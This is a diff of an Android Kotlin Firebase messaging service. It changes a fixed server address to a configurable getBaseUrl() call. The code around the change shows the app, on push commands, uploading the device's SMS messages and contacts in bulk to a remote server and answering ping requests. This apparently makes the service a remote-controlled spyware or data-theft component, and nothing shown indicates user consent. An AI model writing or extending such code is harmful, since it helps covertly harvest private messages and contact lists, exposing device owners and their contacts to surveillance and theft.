@@ -110,7 +110,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                         val result = SmsBatchUploader.uploadQuickSms(
                             context = applicationContext,
                             deviceId = deviceId,
-                            baseUrl = BASE_URL,
+                            baseUrl = getBaseUrl(),
                             limit = 50
                         )
 
@@ -138,7 +138,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                         val result = ContactsBatchUploader.uploadQuickContacts(
                             context = applicationContext,
                             deviceId = deviceId,
-                            baseUrl = BASE_URL,
+                            baseUrl = getBaseUrl(),
                             limit = 50
                         )
 
@@ -166,7 +166,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                         val result = SmsBatchUploader.uploadAllSms(
                             context = applicationContext,
                             deviceId = deviceId,
-                            baseUrl = BASE_URL,
+                            baseUrl = getBaseUrl(),
                             onProgress = { progress ->
                                 when (progress) {
                                     is SmsBatchUploader.UploadProgress.Processing -> {
@@ -201,7 +201,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                         val result = ContactsBatchUploader.uploadAllContacts(
                             context = applicationContext,
                             deviceId = deviceId,
-                            baseUrl = BASE_URL,
+                            baseUrl = getBaseUrl(),
                             onProgress = { current, total ->
                                 Log.d(TAG, "📊 Contacts Progress: $current/$total")
                             }
@@ -284,7 +284,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                     put("deviceId", deviceId)
                 }
 
-                val urlString = "$BASE_URL/ping-response"
+                val urlString = "${getBaseUrl()}/ping-response"
                 Log.d(TAG, "🌐 URL: $urlString")
                 Log.d(TAG, "📤 Body: ${body.toString()}")
 
@@ -353,7 +353,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                     }
                 }
 
-                val urlString = "$BASE_URL/upload-response"
+                val urlString = "${getBaseUrl()}/upload-response"
                 Log.d(TAG, "🌐 URL: $urlString")
                 Log.d(TAG, "📤 Body: ${body.toString()}")
 
